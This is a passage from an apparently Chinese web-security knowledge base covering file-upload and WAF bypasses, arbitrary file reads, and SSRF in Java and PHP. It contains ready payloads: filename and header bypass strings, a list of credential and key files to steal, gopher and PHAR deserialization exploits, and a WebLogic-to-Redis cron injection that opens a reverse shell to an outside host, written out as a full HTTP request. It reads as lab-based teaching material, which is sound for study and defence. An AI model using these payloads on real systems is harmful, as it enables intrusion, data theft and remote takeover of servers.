UPLOAD_PATH.'文件夹不存在,请手工创建！'; } } 上传webshell，抓包在burp修改Content-Type 为以上 修改webshell文件后缀，抓包在burp里修改文件后缀 0x3 黑名单检测 扩展名绕过 Asp：asa，cer，cdx Aspx: ashx，asmx，ascx PHP：phtml，php3 JSP: jspx，jspf windows 特性 文件名后添加空格 文件名后添加点 文件名后添加点空格点(. .) 文件名大小写 文件流::$DATA 双写 双写文件后缀名 双写::$DATA 等等 Apache 特性 Apache 解析漏洞，碰到不认识的扩展名时 , 将会从后向前解析 , 直到碰到认识的扩展名位置 , 如果都不认识 , 则会暴露其源码 Apache .htaccess 解析任意文件为php Apache 扩展解析（AddType application/x-httpd-http） Linux 特性 文件名后添加/ （http put上传可行） 0x4 白名单检测 00截断（文件名可控） 图片马配合文件包含 条件竞争 0x5 文件头检测 添加文件头（常用GIF89a） 0x6 文件体检测 图片马 copy hack.jpg/b + info.php hack.jpg 二次渲染 关于绕过二次渲染,只需要找到渲染前后没有变化的位置,然后将shell代码写进去,就可以成功上传带有代码的文件了 0x7 其他方法（绕WAF） filename 改造 名字特殊符号替换以及构造异常闭合 filename='shell.jspx.jsp' filename=shell.jspx.jsp filename=shell.jspx.jsp' \"filename\"=shell.jspx; 重写 filename=shell.jpg;filename=shell.jspx; filename=shell.jspx;filename=shell.jpg; 大小写变化 FileName=shell.jspx.jsp' 参数污染 FileName=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaashell.jspx.jsp' FileName =shell.jspx（加空格） filename====\"shell.jspx.jsp1\"（加等号） FileName =shell.jspx（前后加空格，中间也可以加特殊符号fuzz） 文件名字编码（filename一般为后端接收参数，编码了可能识别不到，这个就看情况） filename=\\u0073\\u0068\\u0065\\u006c\\u006c\\u002e\\u006a\\u0073\\u0070 回车换行（有时候确实挺好用的，任意位置都可以试一下） ```http FileName=shell.jspx. jsp File Name=shell.jspx.jsp #### name 改造 name也可以任意改造，改造的方法和filename差不多，就不重复发了，主要是思路重要。 其他的比如奇奇怪怪的正则需要用到的特殊字符都可以在文件名中fuzz一下，看看能否打断waf规则，也就是把我们fuzz后缀的再跑一次，或者再找点其他的正则字母。 #### http 头部格式改造 - Content-Disposition - 溢出绕过 ```http Content-Disposition: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa form-data; name=\"file\"; filename=shell.jpg;filename=shell.jspx; 回车换行绕过(不要将固定字符打散) Content-Disposition: form-data; name=\"file\"; filename=shell.jpg;filename=shell.jspx; 双写绕过 Content-Disposition: form-data; name=\"file\"; filename=shell.jpg;filename=shell.jspx; Content-Disposition: form-data; name=\"file\"; filename=shell.jpg;filename=shell.jspx.jpg; 参数污染加减空格等等 boundary 加减空格或者前面加恶意的参数 boundary =---------------------------8472011224916008542288311250 &boundary =---------------------------8472011224916008542288311250 多个污染（他是用来分割的，他变了下面的也要变一下） boundary =---------------------------8472011224916008542288311251 boundary =---------------------------8472011224916008542288311252 回车换行污染 分割污染 Content-Type 直接删除 修改类型为application/text或者 image/jpeg等等 回车换行 溢出 参数污染 重复传入Content-Type 大小写变换 设置charsetContent-Type: multipart/form-data;charset=iso-8859-13 列举几个 ibm869 ibm870 ibm871 ibm918 iso-2022-cn iso-2022-jp iso-2022-jp-2 iso-2022-kr iso-8859-1 iso-8859-13 iso-8859-15 Accept-Encoding 改变编码类型 Accept-Encoding: gzip Accept-Encoding: compress Accept-Encoding: deflate Accept-Encoding: br Accept-Encoding: identity Accept-Encoding: * 修改请求方式，尝试put/get 修改host 头部对host进行回车，换行 修改host头部 host跟链接 host改为127.0.0.1 删除host 分块传输 在头部加入 Transfer-Encoding: chunked 之后，就代表这个报文采用了分块编码。这时，post请求报文中的数据部分需要改为用一系列分块来传输。每个分块包含十六进制的长度值和数据，长度值独占一行，长度不包括它结尾的，也不包括分块数据结尾的，且最后需要用0独占一行表示结束。编码过程中长度需包括空格的长度。最后用0表示编码结束，并在0后空两行表示数据包结束，不然点击提交按钮后会看到一直处于waiting状态。免杀马 高效且实用代码执行处注入内存马 Tomcat 内存马基础参考链接 https://mp.weixin.qq.com/s/DHsv-DXvxbzYdLVevfdS0A https://yanghaoi.github.io/2021/11/24/php-ren-yi-wen-jian-shang-chuan-rao-guo-duo-chong-xian-zhi/ https://blog.csdn.net/weixin_45146120/article/details/103462910 https://xz.aliyun.com/t/10515 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-08-27 15:47:43 "},"知识库/01.WEB安全/05.文件操作/03.文件读取.html":{"url":"知识库/01.WEB安全/05.文件操作/03.文件读取.html","title":"03.文件读取","keywords":"","body":"简介 在读取文件内容文件或文件下载处，未严格限制读取/下载文件的路径及文件后缀，导致可利用../，#等目录操作字符进行目录穿越、截断等手段，从而读取/下载服务器上任意文件，比如配置文件等。 任意文件读取是属于文件操作漏洞的一种，一般任意文件读取漏洞可以读取配置信息甚至系统重要文件。严重的话，就可能导致SSRF，进而漫游至内网。 漏洞产生原因 存读取文件的函数 读取文件的路径用户可控，且未校验或校验不严 输出了文件内容 文件读取函数 readfile()、file_get_contents()、fopen()中，$filename没有经过校验或者校验不合格，用户可控制变量读取任意文件，如/etc/passwd、./index.php、/config.ini。 漏洞详情 文件读取如果系统未对读取/下载文件的文件目录做限制，攻击者利用此漏洞可直接读取web目录下任意文件，比如配置文件、数据库文件等，甚至直接获取服务器上任意文件内容。 一些网站由于业务需求，往往需要提供文件下载功能，但若对用户下载的文件不做限制，则恶意用户就能够下载任意敏感文件，这就是文件下载漏洞。 漏洞产生原因 有读取文件的函数 读物文件的路径用户可控，且没有经过校验，或者校验不严格 输出文件内容 一个正常的网站，存在一个下载文件的功能，同时还会从浏览器接收文件名字 文件下载的两种方式 直接下载 下载 增加header头 开始下载文件'; echo file_get_contents($filename); header('Content-Type: imgage/jpeg'); header('Content-Disposition: attachment; filename='.$filename); header('Content-Lengh: '.filesize($filename)); ?> 漏洞利用 下载常规的配置文件，例如: ssh,weblogic,ftp,mysql等相关配置 下载各种.log文件，从中寻找一些后台地址，文件上传点之类的地方，如果运气好的话会获得一些前辈们的后门。 下载web业务文件进行白盒审计，利用漏洞进一步攻入服务器。 尝试读取/root/.bash_history看自己是否具有root权限。 如果没有，就只能利用../来回跳转读取一些.ssh下的配置信息文件。 读取mysql下的.bash_history文件。来查看是否记录了一些可以利用的相关信息。然后逐个下载需要审计的代码文件，但是下载的时候变得很繁琐，只能尝试去猜解目录，然后下载一些中间件的记录日志进行分析。 一些常见利用方式 Windows： C:\\boot.ini //查看系统版本 C:\\Windows\\System32\\inetsrv\\MetaBase.xml //IIS配置文件 C:\\Windows\\repair\\sam //存储系统初次安装的密码 C:\\Program Files\\mysql\\my.ini //Mysql配置 C:\\Program Files\\mysql\\data\\mysql\\user.MYD //Mysql root C:\\Windows\\php.ini //php配置信息 C:\\Windows\\my.ini //Mysql配置信息 Linux /root/.ssh/authorized_keys //如需登录到远程主机，需要到.ssh目录下，新建authorized_keys文件，并将id_rsa.pub内容复制进去 /root/.ssh/id_rsa //ssh私钥,ssh公钥是id_rsa.pub /root/.ssh/id_ras.keystore //记录每个访问计算机用户的公钥 /root/.ssh/known_hosts //ssh会把每个访问过计算机的公钥(public key)都记录在~/.ssh/known_hosts。当下次访问相同计算机时，OpenSSH会核对公钥。如果公钥不同，OpenSSH会发出警告， 避免你受到DNS Hijack之类的攻击。 /etc/passwd // 账户信息 /etc/shadow // 账户密码文件 /etc/my.cnf //mysql 配置文件 /etc/httpd/conf/httpd.conf // Apache配置文件 /root/.bash_history //用户历史命令记录文件 /root/.mysql_history //mysql历史命令记录文件 /proc/self/fd/fd[0-9]*(文件标识符) /proc/mounts //记录系统挂载设备 /porc/config.gz //内核配置文件 /var/lib/mlocate/mlocate.db //全文件路径 /porc/self/cmdline //当前进程的cmdline参数 示例 修复方案 服务端过滤特殊字符，如：….// ….\\/ …./\\ ….\\。 判断用户输入的参数的格式是否合法。指定文件类型白名单（如：jpg、gif、png、rar、zip、pdf、doc、xls、ppt等），禁止用户读取、下载白名单以外的文件。 指定下载路径，禁止用户读取、下载指定目录以外的文件。 参考链接 https://xz.aliyun.com/t/6594 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-08-27 15:48:12 "},"知识库/01.WEB安全/06.SSRF/":{"url":"知识库/01.WEB安全/06.SSRF/","title":"06.SSRF","keywords":"","body":"定义 SSRF(Server-side request forgery，服务端跨站请求伪造)是一种 Web 安全漏洞，允许攻击者诱导服务器端应用程序向攻击者选择的任意域发出 HTTP 请求。攻击可强制让服务器链接到任意内部或者外部的其他主机，从而可能泄露服务器敏感信息或者对其他主机发起恶意请求。常见的利用方式可以探测内部网络部署的服务信息、端口开放情况，攻击一些内部的服务等。 SSRF成因 SSRF 形成的原因往往是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。如：从指定URL地址获取网页文本内容，加载指定地址的图片，下载等。利用的就是服务端的请求伪造。ssrf是利用存在缺陷的web应用作为代理攻击远程和本地的服务器。 SSRF 类型 根据SSRF 请求后的返回情况来看，SSRF可以分为以下三种情况，一般来说，完全回显的SSRF可以直观的看到SSRF产生的效果，比如可以很快得知内部的一些系统框架版本等信息；部分回显可能只有一些响应状态码等信息来判断内部网络情况；Bind SSRF 这种只能尝试一些如数据外带的方式的利用方式了。 这里使用WebGoat靶场来针对性的讲解如下示例 有回显的SSRF 有回显的SSRF在漏洞触发之后，可以将服务器请求后的详细信息返回。以Webgoat靶场中的SSRF模块来分析，SSRFTask2使用了java.net.URL类对外部发起请求，其关键代码如下 import java.net.URL; try (InputStream in = new URL(url).openStream()) { // Otherwise the \\n gets escaped in the response html = new String(in.readAllBytes(), StandardCharsets.UTF_8).replaceAll(\"\\n\",\"\"); } catch (MalformedURLException e) { return getFailedResult(e.getMessage()); } catch (IOException e) { //in case the external site is down, the test and lesson should still be ok html = \"Although the http://ifconfig.pro site is down, you still managed to solve\" + \" this exercise the right way!\"; } 分析代码，对输入的URL进行了matches匹配，只允许访问http://ifconfig.pro，为了查看回显SSRF效果，将代码中的字符串匹配逻辑修改如下 if (!url.matches(\" \")) { String html; try (InputStream in = new URL(url).openStream()) { ... } catch { .... } } 在这里测试，在url中输入http://www.baidu.com，就会把请求内容返回回来，这种就叫做有回显的ssrf提交的URL参数在服务器上使用java.net.URL类去发起请求，然后打开URL保存二进制流InputStream in = new URL(url).openStream()，最后将结果处理后返回给前端。 侧信息的SSRF（返回状态码，时间延时等） 这种类型因为在后端进行了相应处理，无法获得完整的响应源码，只能通过后端返回状态码，请求响应延时等来判断SSRF情况。像上面的demo可以修改一下模拟这个场景，成功请求返回1,失败返回0 当请求一个不存在的域名导致失败，输出位置返回0： 这就是根据回显信息的不同表现来判断是否成功发起了请求，在SSRF中可以对自身web服务进行请求再和不存在的地址请求，可以观察到不同的响应参数值、响应延时等说明极有可能存在SSRF。 Bind SSRF（完全没有回显或其他侧信息） 这一类的SSRF就完全没有回显和侧信息来泄露利用结果，服务器的返回始终一致，一般的可以通过OOB数据带外来观察是否存在漏洞，如下使用端口监听方法，vps上开启端口监听，在可能存在漏洞的位置写入vps的监听地址 使用dnslog平台判断 SSRF漏洞挖掘 常见漏洞场景 带有URL的参数传递 参数中的图片地址 端口开放情况检测 数据库链接检测 代码仓库的clone 远程文件内容获取 远程图片获取 后台状态刷新 web hook消息同步 远程图片或文件的加载与下载 离线下载 网页翻译 在线转码（ffpmg，ImageMagick，docx，pdf，xml） 收藏功能 云服务厂商 网络探测工具（网络设备） 网站采集 数据库内置（MongoDB） 邮箱（Exchange）在线打印服务 订阅服务 等请求字段中存在IP的地方 关注一些可能使用远程地址的功能、带有URL等关键字的参数、带远程地址的参数值等 常见参数名称 share wap url link src source target u 3g display sourceURI imageURL domain 等等... JAVA中的SSRF 产生SSRF的原因都是在代码层面没有对传入的地址进行严格限制。在JAVA代码审计中，不仅要关注可能对外发起请求的类调用，也要关注一些限制措施是否存在绕过的可能，在手工审计过程中通过功能点审计一些常见的外部请求类和第三方包的使用代码，进而分析是否存在漏洞，总结一些可能存在SSRF漏洞的代码，审计时可以查找类的调用代码，观察输入是否可控、代码过滤是否可以绕过。 在webgoat中，SSRF的两个task都是做过限制，比如如下，如果url不能完全匹配http://ifconfig.pro，则无法进入代码层 JAVA 的网络请求类 java.net.URL webgoat靶场SSRF中的代码，使用URL类中openStream()打开远程链接的数据流： import java.net.URL; try { InputStream in = new URL(url).openStream() } java.net.URLConnection URL类的openConnection方法： import java.net.URLConnection; URLConnection urlConnection = new URL(url).openConnection(); java.net.HttpURLConnection import java.net.HttpURLConnection; URL requrl = new URL(url); HttpURLConnection con = (HttpURLConnection) requrl.openConnection(); java.net.http.* 在JDK11后开始自带，由JDK9的jdk.incubator.http迁移而来： import java.net.http.HttpClient; import java.net.http.HttpRequest; import java.net.http.HttpResponse; HttpClient client = HttpClient.newHttpClient(); HttpRequest request = HttpRequest.newBuilder() .uri( java.net.URI.create(\"http://foo.com/\")) .build(); client.sendAsync(request, HttpResponse.BodyHandlers.ofString()) .thenApply(HttpResponse::body) .thenAccept(System.out::println) .join(); Apache HttpComponents try (CloseableHttpClient httpclient = HttpClients.createDefault()) { ... } httpclient.execute() HttpPost httpPost = new HttpPost ... okhttp OkHttp是一个 Java 的 HTTP+SPDY 客户端开发包，同时也支持 Android，由Square 公司开源贡献，项目官博：https://square.github.io/okhttp/。示例代码： package okhttp3.guide; import java.io.IOException; import okhttp3.OkHttpClient; import okhttp3.Request; import okhttp3.Response; public class GetExample { final OkHttpClient client = new OkHttpClient(); String run(String url) throws IOException { Request request = new Request.Builder() .url(url) .build(); try (Response response = client.newCall(request).execute()) { return response.body().string(); } } public static void main(String[] args) throws IOException { GetExample example = new GetExample(); String response = example.run(\"https://raw.github.com/square/okhttp/master/README.md\"); System.out.println(response); } } Retrofit Retrofit 是 Square 公司出品的默认基于 OkHttp 封装的一套 RESTful 网络请求框架，适用于 Android 和 Java 的类型安全HTTP 客户端，示例代码： Retrofit retrofit = new Retrofit.Builder() .baseUrl(\"https://api.github.com/\") .addConverterFactory(GsonConverterFactory.create()) .build(); GitHubService service = retrofit.create(GitHubService.class); RestTemplate RestTemplate是Spring用于同步客户端HTTP访问的中心类，遵循RESTful规范，简化了与 HTTP 服务器的通信。 RestTemplate restTemplate = new RestTemplate(); ResponseBean responseBean = restTemplate.postForObject(url, requestBean, ResponseBean.class); OpenFeign Feign是一个声明式WebService客户端，其工作原理是将注释处理成模板化的请求，通过占位符{id}来简化API的处理,示例代码： interface Bank { @RequestLine(\"POST /account/{id}\") Account getAccountInfo(@Param(\"id\") String id); } public class BankService { public static void main(String[] args) { Bank bank = Feign.builder() .decoder(new AccountDecoder()) .options(new Request.Options(10, TimeUnit.SECONDS, 60, TimeUnit.SECONDS, true)) .target(Bank.class, \"https://api.examplebank.com\"); } } PHP 中的SSRF PHP 的网络请求函数 在PHP中使用fsockopen()、pfsockopen()、file_get_contents()、show_source()、highlight_file()、curl_exec()、curl_multi_exec()、fopen()、readfile()、mysqli_connect()、include()、require()、file()、copy()等函数不当可能导致SSRF漏洞。可以在php.net中搜索网络请求、套接字建立、数据库链接、文件操作相关的函数，部分函数使用的示例代码如下，代码审计时可根据关键字搜索函数进行分析： url = $_GET['url']; $this->port = $_GET['port']; } function SSRF_fsockopen() { echo \"\".__FUNCTION__.\"\"; $fp = fsockopen($this->url, $this->port, $errno, $errstr, 30); } function SSRF_pfsockopen() { echo \"\".__FUNCTION__ ; $fp = pfsockopen($this->url, $this->port, $errno, $errstr, 5); } function SSRF_file_get_contents(){ echo \"\".__FUNCTION__.\"\"; file_get_contents($this->url); } function SSRF_curl_exec(){ echo \"\".__FUNCTION__.\"\"; $ch = curl_init(); // 设置 URL 和相应的选项 curl_setopt($ch, CURLOPT_URL, $this->url); curl_setopt($ch, CURLOPT_HEADER, 0); // 抓取 URL 并把它传递给浏览器 curl_exec($ch); // 关闭 cURL 资源，并且释放系统资源 curl_close($ch); } function SSRF_curl_multi_exec(){ echo \"\".__FUNCTION__.\"\"; // 创建cURL资源 $ch1 = curl_init(); // 设置URL和相应的选项 curl_setopt($ch1, CURLOPT_URL, $this->url); curl_setopt($ch1, CURLOPT_HEADER, 0); // 创建批处理cURL句柄 $mh = curl_multi_init(); // 增加2个句柄 curl_multi_add_handle($mh,$ch1); $active = null; // 执行批处理句柄 do { $mrc = curl_multi_exec($mh, $active); } while ($mrc == CURLM_CALL_MULTI_PERFORM); while ($active && $mrc == CURLM_OK) { if (curl_multi_select($mh) != -1) { do { $mrc = curl_multi_exec($mh, $active); } while ($mrc == CURLM_CALL_MULTI_PERFORM); } } // 关闭全部句柄 curl_multi_remove_handle($mh, $ch1); curl_multi_close($mh); } function SSRF_fopen(){ echo \"\".__FUNCTION__.\"\"; fopen($this->url,\"r\"); } function SSRF_readfile(){ echo \"\".__FUNCTION__.\"\"; readfile($this->url); } function SSRF_mysqli_connect(){ echo \"\".__FUNCTION__.\"\"; mysqli_connect($this->url, \"my_user\", \"my_password\", \"my_db\"); } function SSRF_include(){ echo \"\".__FUNCTION__.\"\"; include \"$this->url\"; } function SSRF_require(){ echo \"\".__FUNCTION__.\"\"; require \"$this->url\"; } } $S = new SSRF; $S->SSRF_fsockopen(); //url=127.0.0.1&port=9666 $S->SSRF_pfsockopen(); //连接一直不会关闭, url=tcp://127.0.0.1&port=9666 ,可用 ssl://,tls:// $S->SSRF_file_get_contents();// url=http://127.0.0.1:9666/1.php $S->SSRF_curl_exec(); //url=http://127.0.0.1:9666/1.php $S->SSRF_curl_multi_exec(); // url=http://127.0.0.1:9666/1.php $S->SSRF_fopen(); //配置php.ini allow_url_fopen=On,url=http://127.0.0.1:9666/1.php $S->SSRF_readfile(); // url=http://127.0.0.1:9666/1.php $S->SSRF_mysqli_connect(); //url=127.0.0.1:9666 $S->SSRF_include(); //配置php.ini allow_url_include=On,需要文件名为.php,url=http://127.0.0.1:9666/1.php $S->SSRF_require(); //配置php.ini allow_url_include=On,需要文件名为.php,url=http://127.0.0.1:9666/1.php ?> SSRF 可利用的协议 JAVA 经过测试在JDK15中可以支持以下协议使用：http、https、ftp、file、jar、mailto*,openjdk9中移除了协议netdoc,JDK8中移除了gopher协议的支持。以webgoat靶场SSRF为例测试部分协议的使用，使用file协议读取文件/列目录(file:///etc/passwd)： file协议 Jar协议 需要源文件为zip或者jar包，来本地读取文件 jar:file:///home/luogan/Desktop/test.zip!/ShiroExploit.V2.51/config/keys.conf jar:file:///home/luogan/Desktop/ShiroExploit.V2.51/ShiroExploit.jar!/my.css jar协议读取远程文件(jar:http(s)://x.x.x/xx.zip!/file.txt)，同时会下载远程文件保存在本地缓存中： jar:http://127.0.0.1:8888/ShiroExploit.V2.51/ShiroExploit.jar!/my.css java.net.HttpURLConnection类转换 部分类支持的协议会进行限制，使用了HttpURLConnection对openConnection进行类型强制转换后的请求就只支持HTTP(S)： String html = \"\"; String line = \"\"; try{ HttpURLConnection httpURLConnection = (HttpURLConnection) new URL(url).openConnection(); httpURLConnection.setConnectTimeout(10*1000); httpURLConnection.setReadTimeout(10*1000); httpURLConnection.setRequestProperty(\"Charset\", \"utf-8\"); InputStreamReader inputStreamReader = new InputStreamReader(httpURLConnection.getInputStream()); BufferedReader bufferedReader = new BufferedReader(inputStreamReader); while((line = bufferedReader.readLine())!=null){ html += line; } }catch (Exception e){ return getFailedResult(e.getMessage()); } mailto mailto协议可以用来发送邮件，该协议的利用需要后端配置了邮件的发送服务器和相关的支持才能正常使用，协议格式如下： mailto:name1@rapidtables.com?cc=name2@rapidtables.com&bcc=name3@rapidtables.com &subject=The%20subject%20of%20the%20email &body=The%20body%20of%20the%20email //抄送：name2@rapidtables.com //密送：name3@rapidtables.com //主题：The%20subject%20of%20the%20email //正文：The%20body%20of%20the%20email PHP 在PHP中支持的协议： dict:// — 词典网络协议(curl扩展支持) file:// — 访问本地文件系统 http:// — 访问 HTTP(s) URL ftp:// — 访问 FTP(s) URL php:// — 访问各种 I/O 流 zlib:// ——压缩流 data:// — 数据 (RFC 2397) glob:// — 查找匹配模式的路径名 phar:// — PHP 存档 ssh2:// — 安全外壳 2 rar:// — RAR ogg:// — 音频流 expect:// ——流程交互流 gopher:// —— 信息查找系统协议 DATA 协议 DATA协议配合include(require) Getshell data://text/plain,,+号使用url编码) data://image/jpeg, data://text/plain, data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b POST /index.php?url=data://text/plain, DICT 协议 DICT协议是词典网络协议，在RFC 2009中进行描述，使用空格或者:作为分隔参数。在利用dict协议中，一行只能包括一行命令，不能输入多行命令(所以不能攻击认证的redis)： 下面是具体攻击redis服务，由于Redis在Ubuntu上，写入定时任务会预检，导致无法执行，但是在centos上是没有问题的 对于 \\x3c ? => \\x3f : => \\x3a Gopher 协议 该协议在PHP中需要cURL扩展支持，使用curlexec(),curl_multi_exec()函数发起请求。gopher协议格式为gopher://IP:port/{TCP/IP数据流}，开始的字符可以随意，数据流使用URL编码，我们发送到的payload需要双编码，因为gopher协议会将url解码一次，再进行传输不认识\\r\\n或者?就不能成功 注意，GET 请求不带HTTP协议版本，POST请求一定要带HTTP协议版本 将?(%3f)编码成(%25%3f) gopher://192.168.200.38:8888/_%47%45%54%20%2f%74%65%73%74%2e%70%68%70%253f%66%69%6c%65%31%3d%73%68%65%6c%6c%2e%70%68%70%250d%250a%48%6f%73%74%3a%20%31%32%37%2e%30%2e%30%2e%31 POST需要Content-Type,Content-Length,HOST,POST_DATA，请求体整体URL编码 gopher://192.168.200.76:80/_%50%4f%53%54%20%2f%74%65%73%74%31%2e%70%68%70%20%48%54%54%50%20%2f%31%2e%31%250d%250a%48%6f%73%74%3a%20%31%32%37%2e%30%2e%30%2e%31%250d%250a%43%6f%6e%74%65%6e%74%2d%54%79%70%65%3a%20%61%70%70%6c%69%63%61%74%69%6f%6e%2f%78%2d%77%77%77%2d%66%6f%72%6d%2d%75%72%6c%65%6e%63%6f%64%65%64%250d%250a%43%6f%6e%74%65%6e%74%2d%4c%65%6e%67%74%68%3a%20%38%250d%250a%250d%250a%64%61%74%61%3d%31%32%33 PHAR 协议 PHAR协议用于在PHP中解析phar文件，phar文件的meta-data字段存在反序列化漏洞，可以使用协议读取文件触发反序列化，漏洞代码： output); } } file_get_contents($_GET[\"file\"]); 生成phar文件poc output; } } @unlink(\"phar.phar\"); $phar = new Phar('phar.phar'); $phar -> stopBuffering(); $phar -> setStub('GIF89a'.''); $phar -> addFromString('test.txt','test'); $object = new AnyClass(); $object -> output= 'system(\"whoami\");'; $phar -> setMetadata($object); $phar -> stopBuffering(); php://filter 读取本地文件并进行base64编码 php://filter/convert.base64-encode/resource=xx.xx php://filter/read=convert.base64-encode/resource=xx.xx php://input 可以获取请求中的原始流，如读取POST输入流 参考链接 https://cheatsheetseries.owasp.org/assets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet_SSRF_Bible.pdf Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-08-03 15:07:27 "},"知识库/01.WEB安全/06.SSRF/SSRF示例（weblogic_SSRF）.html":{"url":"知识库/01.WEB安全/06.SSRF/SSRF示例（weblogic_SSRF）.html","title":"SSRF示例（weblogic_SSRF）","keywords":"","body":"环境介绍 环境 版本/地址 weblogic WebLogic Server Version: 10.3.6.0192.168.200.38 / 172.21.0.3 redis redis_version:2.8.24172.21.0.2 背景 Weblogic中存在一个SSRF漏洞，利用该漏洞可以发送任意HTTP请求，进而攻击内网中redis、fastcgi等脆弱组件。SSRF漏洞存在于http://192.168.200.38:7001/uddiexplorer/SearchPublicRegistries.jsp 访问一个可以访问的IP:PORT，如http://127.0.0.1:7001 可访问的端口将会得到错误，一般是返回status code（如下图），如果访问的非http协议，则会返回did not have a valid SOAP content-type。 修改为一个不存在的端口，将会返回could not connect over HTTP to server 通过错误的不同，即可探测内网状态。 漏洞利用 注入HTTP头，利用Redis反弹shell Weblogic的SSRF有一个比较大的特点，其虽然是一个“GET”请求，但是我们可以通过传入%0d%0a来注入换行符，而某些服务（如redis写入计划任务(需要运行在centos上，Ubuntu的定时任务会预检格式是否正确，格式不正确无法启动，由于redis备份文件会带上redis特定的标识，所以Ubuntu不能实现定时任务反弹shell)）是通过换行符来分隔每条命令，也就说我们可以通过该SSRF攻击内网中的redis服务器。 首先，通过ssrf探测内网中的redis服务器（redis服务在172.21.0.2） 确定存在redis服务之后，通过注入换行符来写入命令至计划任务 set 1 \"\\n\\n\\n\\n0-59 0-23 1-31 1-12 0-6 root bash -c 'sh -i >& /dev/tcp/192.168.200.38/8888 0>&1'\\n\\n\\n\\n\" config set dir /etc/ config set dbfilename crontab save # url 编码为 %73%65%74%20%31%20%22%5c%6e%5c%6e%5c%6e%5c%6e%30%2d%35%39%20%30%2d%32%33%20%31%2d%33%31%20%31%2d%31%32%20%30%2d%36%20%72%6f%6f%74%20%62%61%73%68%20%2d%63%20%27%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%39%32%2e%31%36%38%2e%32%30%30%2e%33%38%2f%38%38%38%38%20%30%3e%26%31%27%5c%6e%5c%6e%5c%6e%5c%6e%22%0d%0a%63%6f%6e%66%69%67%20%73%65%74%20%64%69%72%20%2f%65%74%63%2f%0d%0a%63%6f%6e%66%69%67%20%73%65%74%20%64%62%66%69%6c%65%6e%61%6d%65%20%63%72%6f%6e%74%61%62%0d%0a%73%61%76%65 注意，换行符是\"\\r\\n\"，也就是\"%0D%0A\" 将url编码后的字符串放在ssrf的域名后面，发送： GET /uddiexplorer/SearchPublicRegistries.jsp?operator=http://172.21.0.2:6379/%0d%0a%0d%0a%73%65%74%20%31%20%22%5c%6e%5c%6e%5c%6e%5c%6e%30%2d%35%39%20%30%2d%32%33%20%31%2d%33%31%20%31%2d%31%32%20%30%2d%36%20%72%6f%6f%74%20%62%61%73%68%20%2d%63%20%27%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%39%32%2e%31%36%38%2e%32%30%30%2e%33%38%2f%38%38%38%38%20%30%3e%26%31%27%5c%6e%5c%6e%5c%6e%5c%6e%22%0d%0a%63%6f%6e%66%69%67%20%73%65%74%20%64%69%72%20%2f%65%74%63%2f%0d%0a%63%6f%6e%66%69%67%20%73%65%74%20%64%62%66%69%6c%65%6e%61%6d%65%20%63%72%6f%6e%74%61%62%0d%0a%73%61%76%65&rdoSearch=name&txtSearchname=11&txtSearchkey=11&txtSearchfor=1111&selfor=Business+location&btnSubmit=Search HTTP/1.1 Host: 192.168.200.38:7001 User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:94.0) Gecko/20100101 Firefox/94.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Origin: http://192.168.200.38:7001 Connection: close Referer: http://192.168.200.38:7001/uddiexplorer/SearchPublicRegistries.jsp Cookie: publicinquiryurls=http://www-3.ibm.com/services/uddi/inquiryapi!IBM|http://www-3.ibm.com/services/uddi/v2beta/inquiryapi!IBM V2|http://uddi.rte.microsoft.com/inquire!Microsoft|http://services.xmethods.net/glue/inquire/uddi!XMethods|; ADMINCONSOLESESSION=RMpshL7ZPJ5PbTd26g8bNMCTjxvT74cgQ4bQv0tBk4BQZ14MhqhK!-1037380163; JSESSIONID=Zw8hhL7JJmZrsn1GXvYh9zThQnctb7SpJGTT9N9kl8DkkDQ32Gjp!-1037380163 Upgrade-Insecure-Requests: 1 实际redis服务接收到的请求如下图所示 写入计划任务后，执行反弹shell命令如下所示 其他 最后补充一下，可进行利用的cron有如下几个地方： /etc/crontab 这个是肯定的 /etc/cron.d/* 将任意文件写到该目录下，效果和crontab相同，格式也要和/etc/crontab相同。漏洞利用这个目录，可以做到不覆盖任何其他文件的情况进行弹shell。 /var/spool/cron/root centos系统下root用户的cron文件 /var/spool/cron/crontabs/root debian系统下root用户的cron文件参考链接 https://vulhub.org/#/environments/weblogi.// Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-07-13 11:32:32 "},"知识库/01.WEB安全/06.SSRF/SSRF绕过方式.html":{"url":"知识库/01.WEB安全/06.SSRF/SSRF绕过方式.html","title":"SSRF绕过方式","keywords":"","body":"在代码实现过程中，开发者为了防御SSRF漏洞，会对相关的请求进行验证(黑名单、白名单、正则匹配等)，但是其中一些过滤代码存在绕过的可能行，这里总结一些常见的绕过方法(部分方法只能在浏览器中或需要特定语言函数实现，需要结合场景使用，如进行一些社会工程学欺骗等)。 URL中使用@ URL(Uniform Resource Locator,统一资源定位符),用于在互联网中定位数据资源，其完整格式如下 [协议类型]://[访问资源需要的凭证信息]@[服务器地址]:[端口号]/[资源层级UNIX文件路径][文件名]?[查询]#[片段ID] 由格式可知，@符号之后是服务器的地址，可以用于在SSRF一些正则匹配中绕过，从而定位到@之后的服务器地址： http://google.com:80+&@220.181.38.251:80/#+@google.com:80/ curl 带着值为qq.com:的Authorization验证头访问百度 IP进制转换 IP地址是一个32位的二进制数，通常被分割为4个8位二进制数。通常用“点分十进制”表示成（a.b.c.d）的形式，所以IP地址的每一段可以用其他进制来转换。 IPFuscator 工具可实现IP地址的进制转换，包括了八进制、十进制、十六进制、混合进制。在这个工具的基础上添加了IPV6的转换和版本输出的优化： 在脚本对IP进行八进制转换时，一些情况下会在字符串末尾多加一个L: 这是因为在Python2下区分了int和long类型，int数据超出最大值2147483647后会表示为long类型，体现在八进制转换后的字符串末尾跟了个L: 而在python3中都使用int处理，所以可以将脚本升级到Python来用，使用2to3.py工具python3 2to3.py -w xx.py转换代码： 